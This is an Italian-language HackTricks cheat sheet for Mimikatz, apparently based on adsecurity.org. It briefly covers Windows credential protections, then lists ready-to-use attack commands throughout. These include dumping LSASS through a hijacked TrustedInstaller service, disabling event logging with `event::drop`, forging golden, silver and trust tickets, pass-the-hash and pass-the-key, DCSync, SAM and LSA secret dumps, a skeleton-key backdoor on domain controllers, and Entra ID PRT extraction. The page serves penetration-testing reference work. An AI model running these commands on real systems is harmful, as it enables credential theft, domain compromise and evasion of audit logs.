# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Questa pagina si basa su una pagina di [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consulta l'originale per ulteriori informazioni!<sup>[[3]](#references)</sup>

## LM e testo in chiaro in memoria

A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere dal credential theft:

- **Gli hash LM e le password in chiaro** non vengono più memorizzati in memoria per migliorare la sicurezza. Una specifica impostazione del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD pari a `0` per disabilitare Digest Authentication, assicurando che le password "in chiaro" non vengano memorizzate nella cache di LSASS.

- Viene introdotta la **LSA Protection** per proteggere il processo Local Security Authority (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo risultato viene ottenuto contrassegnando LSASS come protected process. L'attivazione della LSA Protection richiede:
1. Modificare il registro in _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
2. Implementare un Group Policy Object (GPO) che imponga questa modifica del registro sui dispositivi gestiti.

Nonostante queste protezioni, strumenti come Mimikatz possono aggirare la LSA Protection utilizzando driver specifici, anche se è probabile che tali azioni vengano registrate negli event log.

Sulle workstation moderne questo aspetto è ancora più importante perché **Credential Guard è abilitato di default su molti sistemi Windows 11 22H2+ e Windows Server 2025 aggiunti al dominio e non-DC**, mentre **LSASS-as-PPL è abilitato di default sulle nuove installazioni di Windows 11 22H2+**. In pratica, ciò significa che `sekurlsa::logonpasswords` spesso restituisce meno materiale rispetto a quanto previsto dalle tecniche più datate e gli operatori ricorrono sempre più spesso a **offline minidumps**, all'**estrazione delle chiavi Kerberos (`sekurlsa::ekeys`)** o a moduli orientati a **CloudAP/PRT**. Per la parte relativa alla protezione, consulta [Windows credentials protections](credentials-protections.md).

### Contrastare la rimozione di SeDebugPrivilege

Gli amministratori dispongono normalmente di SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per impedire memory dump non autorizzati, una tecnica comune utilizzata dagli attaccanti per estrarre credenziali dalla memoria. Tuttavia, anche dopo la rimozione di questo privilegio, l'account TrustedInstaller può comunque eseguire memory dump tramite una configurazione personalizzata del servizio:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Questo consente di eseguire il dump della memoria di `lsass.exe` in un file, che può quindi essere analizzato su un altro sistema per estrarre le credenziali:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opzioni di Mimikatz

La manomissione dei log degli eventi in Mimikatz comprende due azioni principali: cancellare i log degli eventi e applicare una patch al servizio Event per impedire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:

#### Cancellazione dei log degli eventi

- **Comando**: questa azione mira a eliminare i log degli eventi, rendendo più difficile tracciare le attività dannose.
- Mimikatz non fornisce un comando diretto nella documentazione standard per cancellare i log degli eventi direttamente dalla riga di comando. Tuttavia, la manipolazione dei log degli eventi generalmente prevede l'uso di strumenti di sistema o script esterni a Mimikatz per cancellare log specifici (ad esempio, usando PowerShell o Visualizzatore eventi di Windows).

#### Funzionalità sperimentale: applicazione di una patch al servizio Event

- **Comando**: `event::drop`
- Questo comando sperimentale è progettato per modificare il comportamento del servizio di registrazione degli eventi, impedendogli di fatto di registrare nuovi eventi.
- Esempio: `mimikatz "privilege::debug" "event::drop" exit`

- Il comando `privilege::debug` garantisce che Mimikatz operi con i privilegi necessari per modificare i servizi di sistema.
- Il comando `event::drop` applica quindi una patch al servizio di registrazione degli eventi.

### Attacchi ai ticket Kerberos

Usa i comandi riportati di seguito come promemoria rapido della sintassi. Le pagine dedicate ai [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contengono le informazioni aggiornate sulle specificità AES/PAC/opsec.

### Creazione di un Golden Ticket

Un Golden Ticket consente di impersonare un account con accesso all'intero dominio. Comando e parametri principali:

- Comando: `kerberos::golden`
- Parametri:
- `/domain`: il nome del dominio.
- `/sid`: il Security Identifier (SID) del dominio.
- `/user`: il nome utente da impersonare.
- `/krbtgt`: l'hash NTLM dell'account di servizio KDC del dominio.
- `/ptt`: inietta direttamente il ticket nella memoria.
- `/ticket`: salva il ticket per un utilizzo successivo.

Esempio:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

I Silver Ticket concedono l'accesso a servizi specifici. Comando e parametri principali:

- Command: Simile al Golden Ticket, ma con targeting di servizi specifici.
- Parameters:
- `/service`: Il servizio target (ad esempio, cifs, http).
- Altri parametri simili al Golden Ticket.

Esempio:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

I Trust Tickets vengono utilizzati per accedere a risorse tra domini sfruttando le relazioni di trust. Comandi e parametri principali:

- Comando: Simile a Golden Ticket, ma per le relazioni di trust.
- Parametri:
- `/target`: l'FQDN del dominio di destinazione.
- `/rc4`: l'hash NTLM dell'account di trust.

Esempio:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandi Kerberos aggiuntivi

- **Listing Tickets**:

- Comando: `kerberos::list`
- Elenca tutti i ticket Kerberos per la sessione utente corrente.

- **Pass the Cache**:

- Comando: `kerberos::ptc`
- Inietta i ticket Kerberos dai file della cache.
- Esempio: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Comando: `kerberos::ptt`
- Consente di utilizzare un ticket Kerberos in un'altra sessione.
- Esempio: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Comando: `kerberos::purge`
- Cancella tutti i ticket Kerberos dalla sessione.
- Utile prima di usare i comandi di manipolazione dei ticket per evitare conflitti.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` è disabilitato o inaffidabile, Mimikatz può applicare le **chiavi Kerberos AES128/AES256** alla sessione di accesso corrente invece di usare soltanto un hash NT. In genere, questo è più adatto ai domini moderni rispetto a trattare `sekurlsa::pth` come esclusivamente NTLM.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` riutilizza il processo corrente invece di avviare una nuova console, il che è utile quando vuoi eseguire immediatamente comandi come `lsadump::dcsync` nello stesso contesto.

### Manomissione di Active Directory

- **DCShadow**: fa temporaneamente agire una macchina come un DC per la manipolazione degli oggetti AD. Vedi [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: simula un DC per richiedere dati sulle password. Vedi [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accesso alle credenziali

- **LSADUMP::LSA**: estrae le credenziali da LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: impersona un DC utilizzando i dati della password dell'account di un computer.

- _Nessun comando specifico fornito per NetSync nel contesto originale._

- **LSADUMP::SAM**: accede al database SAM locale.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: decritta i segreti archiviati nel registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: imposta un nuovo hash NTLM per un utente.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: recupera le informazioni di autenticazione delle relazioni di trust.
- `mimikatz "lsadump::trust" exit`

### Credenziali cloud / Entra ID

Sugli host **Entra ID** o **hybrid-joined**, `sekurlsa::cloudap` può esporre il materiale memorizzato nella cache del **Primary Refresh Token (PRT)** da LSASS. Se la chiave Proof-of-Possession associata è protetta tramite software, `dpapi::cloudapkd` può derivare il materiale della chiave in chiaro/derivata necessario per i workflow successivi di **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Questo diventa molto più difficile quando la chiave è protetta da TPM, ma vale la pena controllare gli endpoint ibridi perché i dati CloudAP memorizzati nella cache potrebbero essere più interessanti dell'output classico di `wdigest`.<sup>[[2]](#references)</sup> Per la catena di abuso cloud-side, vedere [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Varie

- **MISC::Skeleton**: Iniettare una backdoor in LSASS su un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalation dei privilegi

- **PRIVILEGE::Backup**: Acquisire i diritti di backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Ottenere i privilegi di debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Mostrare le credenziali degli utenti con sessione attiva.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Estrarre i ticket Kerberos dalla memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipolazione di SID e Token

- **SID::add/modify**: Modificare SID e SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Nessun comando specifico per modify nel contesto originale._

- **TOKEN::Elevate**: Impersonare token.
- `mimikatz "token::elevate /domainadmin" exit`

### Servizi Terminal

- **TS::MultiRDP**: Consentire sessioni RDP multiple.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Elencare le sessioni TS/RDP.
- _Nessun comando specifico fornito per TS::Sessions nel contesto originale._

### Vault

- Estrarre le password da Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Riferimenti

- [1] [The Hacker Tools – Moduli Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Riferimento dei comandi Mimikatz](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
